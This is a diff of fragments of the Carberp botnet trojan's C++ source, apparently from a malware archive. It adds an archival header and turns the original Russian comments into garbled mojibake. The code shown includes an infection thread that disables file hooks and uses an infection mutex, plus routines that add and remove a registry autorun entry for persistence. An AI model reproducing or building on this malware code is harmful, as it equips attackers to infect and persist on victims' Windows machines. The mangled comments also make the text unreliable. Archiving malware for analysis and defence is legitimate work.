@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "stdafx.h"
 
 #include <windows.h>
@@ -30,8 +41,8 @@ static DWORD WINAPI procInfection(void *)
 {
   CoreHook::disableFileHookerForCurrentThread(true);
 
-  //FIXME: защита файлов бота, если не влючен TT защищаемся также от чтения.  
-  //FIXME: защита реестра, путем восстановления.
+  //FIXME: пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ TT пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.  
+  //FIXME: пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   
   HANDLE mutex = Core::waitForMutexOfObject(Core::OBJECT_ID_CONTROL_INFECTION, MalwareTools::KON_SESSION);
   if(mutex == NULL)
@@ -76,7 +87,7 @@ static DWORD WINAPI procAutorun(void *)
   CWA(shlwapi, PathQuoteSpacesW)(processPath);
   processPathSize = Str::_LengthW(processPath);
   
-  //Цикл.
+  //пїЅпїЅпїЅпїЅ.
   if(Core::isActive())
   {
     CSTR_GETW(regPath, regpath_autorun);
@@ -109,7 +120,7 @@ bool CoreControl::_removeAutorun(void)
   {
     if(!Registry::_deleteValue(HKEY_CURRENT_USER, regPath, autorunName))return false;
     
-    //Страховка от незавершенного procAutorun().
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ procAutorun().
     CWA(kernel32, Sleep)(500);
     if(!Registry::_valueExists(HKEY_CURRENT_USER, regPath, autorunName))return true;
   }
